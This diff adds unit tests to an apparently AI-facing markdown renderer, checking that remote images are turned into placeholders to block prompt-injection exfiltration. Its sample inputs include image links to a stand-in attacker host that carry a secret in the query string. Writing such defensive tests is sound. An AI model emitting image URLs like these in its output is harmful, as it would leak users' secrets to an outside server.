@@ -444,3 +444,26 @@ describe("over-escaped command heal — doubled backslashes in tool args (owner 
 	});
 });
 
+
+describe("render — external images never load (prompt-injection exfiltration)", () => {
+	it("turns a remote markdown or raw-HTML image into a placeholder with no request target", () => {
+		for (const md of [
+			"Diagram: ![Krebs cycle](https://attacker.example/log?k=SECRET)",
+			'Diagram: <img src="https://attacker.example/log?k=SECRET" alt="Krebs cycle">',
+		]) {
+			const html = render(md);
+			assert.ok(!html.includes("attacker.example/log"), `no request URL left in the markup: ${md}`);
+			assert.ok(!/<img\b/.test(html), `no <img> element: ${md}`);
+			assert.match(html, /\[image not loaded: Krebs cycle · attacker\.example\]/, md);
+		}
+		assert.match(render("![](https://attacker.example/x.png)"), /\[image not loaded: image · attacker\.example\]/, "no alt text");
+		assert.ok(!render("![a](//attacker.example/log?k=SECRET)").includes("attacker.example"), "protocol-relative: the host is dropped");
+	});
+
+	it("keeps same-server images, and math still renders", () => {
+		assert.match(render("![figure](/api/figures/f1.png)"), /<img[^>]*src="\/api\/figures\/f1\.png"/);
+		const math = render("Mass $E = mc^2$ and ![x](https://attacker.example/y)");
+		assert.ok(math.includes("katex"), "math plugin still runs after the image guard");
+		assert.ok(!math.includes("attacker.example/y"));
+	});
+});
